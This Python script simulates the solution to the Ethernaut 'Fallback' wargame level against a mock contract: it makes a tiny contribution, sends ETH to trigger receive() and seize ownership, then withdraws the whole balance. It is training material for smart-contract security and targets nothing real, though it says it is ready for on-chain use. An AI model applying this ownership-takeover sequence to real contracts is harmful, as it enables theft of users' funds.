#!/usr/bin/env python3
"""
Ethernaut Level 2: Fallback - Exploit Validator
Validates the exploit logic without needing on-chain execution
"""

class MockFallback:
    """Simulates the Ethernaut Level 2 (Fallback) contract"""
    
    def __init__(self):
        self.owner = "0xdeployer"
        self.contributions = {}
        self.balance = 1000000000000000000  # 1 ETH
    
    def contribute(self, sender: str, value: int):
        """Step 1: Contribute small amount (< 0.001 ETH)"""
        require = value < 1000000000000000  # < 0.001 ETH
        if not require:
            raise ValueError("Contribution too large")
        self.contributions[sender] = self.contributions.get(sender, 0) + value
        self.balance += value
        return True
    
    def receive_fallback(self, sender: str, value: int):
        """Step 2: receive() becomes owner if contribution > 0"""
        contribution = self.contributions.get(sender, 0)
        if contribution > 0 and value > 0:
            self.owner = sender
            self.balance += value
            return True
        raise ValueError("Cannot become owner: no contribution or no value sent")
    
    def withdraw(self, sender: str):
        """Step 3: Drain contract (only owner)"""
        if sender != self.owner:
            raise ValueError("Only owner can withdraw")
        amount = self.balance
        self.balance = 0
        return amount
    
    def getContribution(self, sender: str) -> int:
        return self.contributions.get(sender, 0)

def run_exploit():
    """Execute the exploit steps and validate"""
    print("=" * 60)
    print("Ethernaut Level 2: Fallback - Exploit Simulation")
    print("=" * 60)
    
    contract = MockFallback()
    attacker = "0xattacker"
    
    print(f"\nðŸ“Š Initial State:")
    print(f"   Owner: {contract.owner}")
    print(f"   Balance: {contract.balance / 1e18:.4f} ETH")
    print(f"   Attacker contribution: {contract.getContribution(attacker) / 1e18:.4f} ETH")
    
    # Step 1: Contribute small amount
    print("\n[STEP 1] contribute() with 0.0005 ETH...")
    contribution_amount = 500000000000000  # 0.0005 ETH
    contract.contribute(attacker, contribution_amount)
    print(f"  Contributed: {contribution_amount / 1e18:.4f} ETH")
    assert contract.getContribution(attacker) > 0, "Step 1 failed"
    print("  âœ“ PASS")
    
    # Step 2: Send ETH to trigger receive() and become owner
    print("\n[STEP 2] Send ETH to contract (triggers receive())...")
    send_amount = 1000000000000000  # 0.001 ETH
    contract.receive_fallback(attacker, send_amount)
    print(f"  Sent: {send_amount / 1e18:.4f} ETH")
    print(f"  New owner: {contract.owner}")
    assert contract.owner == attacker, "Step 2 failed - not owner"
    print("  âœ“ PASS")
    
    # Step 3: Withdraw all funds
    print("\n[STEP 3] withdraw() to drain contract...")
    drained = contract.withdraw(attacker)
    print(f"  Drained: {drained / 1e18:.4f} ETH")
    print(f"  Contract balance: {contract.balance / 1e18:.4f} ETH")
    assert contract.balance == 0, "Step 3 failed - not drained"
    assert contract.owner == attacker, "Step 3 failed - ownership lost"
    print("  âœ“ PASS")
    
    print("\n" + "=" * 60)
    print("ðŸŽ‰ EXPLOIT VALIDATION SUCCESSFUL!")
    print("Attack flow:")
    print("  1. contribute() small amount to get contributor status")
    print("  2. Direct ETH send â†’ receive() â†’ become owner")
    print("  3. withdraw() â†’ drain all funds")
    print("\nReady for on-chain execution when credentials available.")
    print("=" * 60)
    
    return True

if __name__ == "__main__":
    success = run_exploit()
    exit(0 if success else 1)
